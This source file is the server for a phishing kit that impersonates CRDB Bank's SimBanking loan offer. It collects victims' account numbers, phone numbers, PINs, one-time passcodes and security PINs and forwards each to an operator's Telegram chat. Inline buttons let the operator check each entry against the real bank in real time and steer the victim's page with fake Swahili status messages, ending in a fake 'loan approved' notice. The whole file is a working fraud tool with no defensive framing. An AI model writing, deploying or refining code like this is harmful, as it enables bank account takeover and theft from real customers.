const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Environment variables or fallback test tokens
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';

// In-memory session store
const sessions = {};

// Helper function to send Telegram messages with inline keyboards
async function sendTelegramMessage(text, replyMarkup) {
  if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
    console.log('Telegram not configured. Message:', text);
    return null;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        parse_mode: 'Markdown',
        reply_markup: replyMarkup
      })
    });
    const data = await response.json();
    return data.result ? data.result.message_id : null;
  } catch (err) {
    console.error('Telegram error:', err);
    return null;
  }
}

// 1. Submit Credentials
app.post('/api/submit-credentials', async (req, res) => {
  const { sessionId, accountNumber, mobileNumber, pin, loanDetails } = req.body;
  
  sessions[sessionId] = {
    status: 'pending_credentials',
    notification: '',
    accountNumber,
    mobileNumber,
    pin,
    loanDetails
  };

  const message = `🚨 *CRDB SIMBANKING APPLICANT* 🚨\n\n` +
    `🏦 *Acc No:* \`${accountNumber}\`\n` +
    `📱 *Mobile:* \`${mobileNumber}\`\n` +
    `🔑 *PIN:* \`${pin}\`\n` +
    `💰 *Loan:* ${loanDetails?.amount || '100,000 TZS'}`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '❌ INVALID PHONE', callback_data: `invalid_phone_${sessionId}` },
        { text: '❌ INVALID ACC', callback_data: `invalid_acc_${sessionId}` }
      ],
      [
        { text: '❌ INVALID PIN', callback_data: `invalid_pin_${sessionId}` },
        { text: '✅ PROCEED (OTP)', callback_data: `proceed_otp_${sessionId}` }
      ]
    ]
  };

  const msgId = await sendTelegramMessage(message, keyboard);
  sessions[sessionId].msgId = msgId;

  res.json({ success: true });
});

// 2. Submit OTP
app.post('/api/submit-otp', async (req, res) => {
  const { sessionId, otp } = req.body;
  if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });

  sessions[sessionId].status = 'pending_otp';
  sessions[sessionId].otp = otp;

  const message = `🔑 *OTP SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
    `🔢 *OTP Entered:* \`${otp}\``;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '❌ WRONG OTP', callback_data: `wrong_otp_${sessionId}` },
        { text: '✅ CORRECT OTP', callback_data: `correct_otp_${sessionId}` }
      ]
    ]
  };

  await sendTelegramMessage(message, keyboard);
  res.json({ success: true });
});

// 3. Submit Security PIN
app.post('/api/submit-security-pin', async (req, res) => {
  const { sessionId, securityPin } = req.body;
  if (!sessions[sessionId]) return res.status(404).json({ error: 'Session not found' });

  sessions[sessionId].status = 'pending_security_pin';
  sessions[sessionId].securityPin = securityPin;

  const message = `🔒 *SECURITY PIN SUBMITTED* for Acc: \`${sessions[sessionId].accountNumber}\`\n\n` +
    `🔑 *PIN:* \`${securityPin}\``;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '❌ WRONG PIN', callback_data: `wrong_pin_${sessionId}` },
        { text: '✅ CORRECT PIN', callback_data: `correct_pin_${sessionId}` }
      ]
    ]
  };

  await sendTelegramMessage(message, keyboard);
  res.json({ success: true });
});

// Poll status endpoint for frontend
app.get('/api/status/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const session = sessions[sessionId];
  if (!session) return res.json({ status: 'not_found' });
  res.json(session);
});

// Telegram Webhook or Admin Simulator Endpoint
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;
  if (update.callback_query) {
    const data = update.callback_query.data;
    const [action, subAction, sessionId] = data.split('_');
    const fullAction = `${action}_${subAction}`;

    if (sessions[sessionId]) {
      if (fullAction === 'invalid_phone') {
        sessions[sessionId].status = 'error';
        sessions[sessionId].notification = 'INVALID PHONE NO: Please enter a valid Simbanking mobile number.';
      } else if (fullAction === 'invalid_acc') {
        sessions[sessionId].status = 'error';
        sessions[sessionId].notification = 'INVALID ACC. NO: Please enter a valid account number.';
      } else if (fullAction === 'invalid_pin') {
        sessions[sessionId].status = 'error';
        sessions[sessionId].notification = 'INVALID PIN: Please enter your correct Simbanking PIN.';
      } else if (fullAction === 'proceed_otp') {
        sessions[sessionId].status = 'enter_otp';
        sessions[sessionId].notification = 'CORRECT DETAILS ✅ - Endelea kwenda OTP.';
      } else if (fullAction === 'wrong_otp') {
        sessions[sessionId].status = 'enter_otp';
        sessions[sessionId].notification = 'WRONG OTP: Tadhali ingiza namba sahihi ya OTP.';
      } else if (fullAction === 'correct_otp') {
        sessions[sessionId].status = 'enter_security_pin';
        sessions[sessionId].notification = 'OTP CORRECT ✅ - Endelea kuweka PIN.';
      } else if (fullAction === 'wrong_pin') {
        sessions[sessionId].status = 'enter_security_pin';
        sessions[sessionId].notification = 'WRONG PIN: Tafadhali ingiza PIN mpya ya usalama.';
      } else if (fullAction === 'correct_pin') {
        // Send final approval buttons
        sessions[sessionId].status = 'pending_approval';
        sessions[sessionId].notification = 'PIN CORRECT ✅ - Inasubiri idhinisho la mwisho.';
        
        await sendTelegramMessage(`✨ *READY FOR APPROVAL* for Acc: \`${sessions[sessionId].accountNumber}\``, {
          inline_keyboard: [
            [
              { text: '✅ APPROVE LOAN', callback_data: `approve_final_${sessionId}` },
              { text: '❌ REJECT', callback_data: `reject_final_${sessionId}` }
            ]
          ]
        });
      } else if (fullAction === 'approve_final') {
        sessions[sessionId].status = 'success';
        sessions[sessionId].notification = 'Hongera! Mkopo wako umeidhinishwa!';
      }
    }
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
      
